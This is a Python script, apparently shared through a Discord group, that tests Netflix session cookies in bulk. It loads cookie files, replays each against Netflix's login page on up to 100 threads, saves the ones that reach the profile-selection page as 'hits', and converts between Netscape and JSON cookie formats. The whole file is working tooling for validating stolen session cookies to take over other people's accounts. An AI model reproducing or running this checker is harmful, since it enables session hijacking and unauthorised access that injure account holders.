import requests
import os
import colorama
import shutil
import keyboard
import json
import threading

# Clear screen function
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to check Netscape format cookies
def check_netscape_cookies(num_threads=1):
    counts = {'hits': 0, 'bad': 0, 'errors': 0}

    def check_cookie(cookie):
        try:
            cookie_path = os.path.join("cookies", cookie)
            with open(cookie_path, 'r', encoding='utf-8') as f:
                read_cookie = f.read()

                cookies = {}
                for line in read_cookie.splitlines():
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        domain, _, path, secure, expires, name, value = parts[:7]
                        cookies[name] = value

                session = requests.Session()
                session.cookies.update(cookies)
                session.headers.update({'Accept-Encoding': 'identity'})

                response = session.get("https://www.netflix.com/in/login")

                if "whos.watching" in response.text:
                    counts['hits'] += 1
                    print(colorama.Fore.GREEN + f"Login successful with {cookie}" + colorama.Fore.RESET)
                    shutil.copy(cookie_path, os.path.join("hits", cookie))
                else:
                    counts['bad'] += 1
                    print(colorama.Fore.RED + f"Login failed with {cookie}" + colorama.Fore.RESET)
        except Exception as e:
            counts['errors'] += 1
            print(colorama.Fore.RED + f"Error: {e} with {cookie}" + colorama.Fore.RESET)

    cookie_files = os.listdir("cookies")
    threads = []

    def worker():
        while True:
            try:
                cookie = cookie_files.pop(0)
            except IndexError:
                break
            check_cookie(cookie)

    for _ in range(min(num_threads, len(cookie_files), 100)):
        thread = threading.Thread(target=worker)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print("\n\nFinished Checking")
    print(f"Good: {counts['hits']} - Bad: {counts['bad']} - Errors: {counts['errors']}")
    input("Press enter to return\n")
    clear_screen()
    main()

# Function to check JSON format cookies
def check_json_cookies(num_threads=1):
    counts = {'hits': 0, 'bad': 0, 'errors': 0}

    def check_cookie(cookie_name):
        try:
            cookie_path = os.path.join("cookies", cookie_name)
            with open(cookie_path, 'r', encoding='utf-8') as f:
                cookies_json = json.load(f)

                cookies = {}
                for cookie in cookies_json:
                    name = cookie.get('name')
                    value = cookie.get('value')
                    domain = cookie.get('domain')
                    path = cookie.get('path')
                    secure = cookie.get('secure', False)
                    expires = cookie.get('expires', None)

                    if name and value and domain and path:
                        cookies[name] = value

                session = requests.Session()
                session.cookies.update(cookies)
                session.headers.update({'Accept-Encoding': 'identity'})

                response = session.get("https://www.netflix.com/in/login")

                if "whos.watching" in response.text:
                    counts['hits'] += 1
                    print(colorama.Fore.GREEN + f"Login successful with {cookie_name}" + colorama.Fore.RESET)
                    shutil.copy(cookie_path, os.path.join("hits", cookie_name))
                else:
                    counts['bad'] += 1
                    print(colorama.Fore.RED + f"Login failed with {cookie_name}" + colorama.Fore.RESET)
        except Exception as e:
            counts['errors'] += 1
            print(colorama.Fore.RED + f"Error: {e} with {cookie_name}" + colorama.Fore.RESET)

    cookie_files = os.listdir("cookies")
    threads = []

    def worker():
        while True:
            try:
                cookie = cookie_files.pop(0)
            except IndexError:
                break
            check_cookie(cookie)

    for _ in range(min(num_threads, len(cookie_files), 100)):
        thread = threading.Thread(target=worker)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    print("\n\nFinished Checking")
    print(f"Good: {counts['hits']} - Bad: {counts['bad']} - Errors: {counts['errors']}")
    input("Press enter to return\n")
    clear_screen()
    main()

# Function to convert JSON format cookies to Netscape
def convert_json_to_netscape():
    print("Converting Json to Netscape...")
    clear_screen()

    def bool_to_string(s):
        return "TRUE" if s else "FALSE"

    def check_tail_match(s):
        return "TRUE" if s[0] == "." else "FALSE"

    convert_folder = 'convert'
    converted_folder = 'converted'

    for cookie in os.listdir(convert_folder):
        try:
            cookie_path = os.path.join(convert_folder, cookie)
            with open(cookie_path, 'r', encoding='utf-8') as f:
                cookies_json = json.load(f)

                with open(os.path.join(converted_folder, cookie), 'w', encoding='utf-8') as write:
                    for x in cookies_json:
                        write.write(
                            f"{x['domain']}\t{check_tail_match(x['domain'])}\t{x['path']}\t{bool_to_string(x['secure'])}\t0\t{x['name']}\t{x['value']}\n")

        except Exception as e:
            print(f"Error: {e} with {cookie}")
            continue

    print("Completed converting cookies")
    input("Press enter to return\n")
    clear_screen()
    main()

# Function to convert Netscape format cookies to JSON
def convert_netscape_to_json():
    print("Converting Netscape to Json...")
    clear_screen()

    def string_to_bool(s):
        return s.upper() == "TRUE"

    convert_folder = 'convert'
    converted_folder = 'converted'

    for cookie in os.listdir(convert_folder):
        try:
            cookie_path = os.path.join(convert_folder, cookie)
            with open(cookie_path, 'r', encoding='utf-8') as f:
                cookies_json = []

                for line in f:
                    if line.strip() and not line.startswith("#"):
                        parts = line.strip().split('\t')
                        if len(parts) >= 7:
                            domain = parts[0]
                            tailmatch = parts[1]
                            path = parts[2]
                            secure = string_to_bool(parts[3])
                            name = parts[5]
                            value = parts[6]

                            cookie_data = {
                                "domain": domain,
                                "tailmatch": tailmatch,
                                "path": path,
                                "secure": secure,
                                "name": name,
                                "value": value
                            }

                            cookies_json.append(cookie_data)

                with open(os.path.join(converted_folder, cookie), 'w', encoding='utf-8') as f:
                    json.dump(cookies_json, f, indent=4)

        except Exception as e:
            print(f"Error: {e} with {cookie}")
            continue

    print("Completed converting cookies")
    input("Press enter to return\n")
    clear_screen()
    main()

# Main function to display options and handle user input
def main():
    print("""
          _ ___ _    ___       _  _   _      _  _  
    |\ | |_  | |_ |   |  \/   /  / \ / \ |/ |_ |_) 
    | \| |_  | |  |_ _|_ /\   \_ \_/ \_/ |\ |_ | \                                                
            by FMP Discord -> https://discord.gg/w9dN5GuApT                                                                  
    """)
    print("[1] Check Netscape Cookies")
    print("[2] Check Json Cookies")
    print("[3] Convert Netscape to Json")
    print("[4] Convert Json to Netscape")
    print("[esc] Exit")

    while True:
        if keyboard.is_pressed('1'):
            clear_screen()
            try:
                num_threads = int(input("Enter number of threads (1-100): "))
                if num_threads < 1 or num_threads > 100:
                    raise ValueError
            except ValueError:
                print("Invalid input")
                clear_screen()
                main()
            check_netscape_cookies(num_threads)

        elif keyboard.is_pressed('2'):
            clear_screen()
            try:
                num_threads = int(input("Enter number of threads (1-100): "))
                if num_threads < 1 or num_threads > 100:
                    raise ValueError
            except ValueError:
                print("Invalid input")
                clear_screen()
                main()
            check_json_cookies(num_threads)
        elif keyboard.is_pressed('3'):
            convert_netscape_to_json()
        elif keyboard.is_pressed('4'):
            convert_json_to_netscape()
        elif keyboard.is_pressed('esc'):
            exit()

if __name__ == "__main__":
    main()
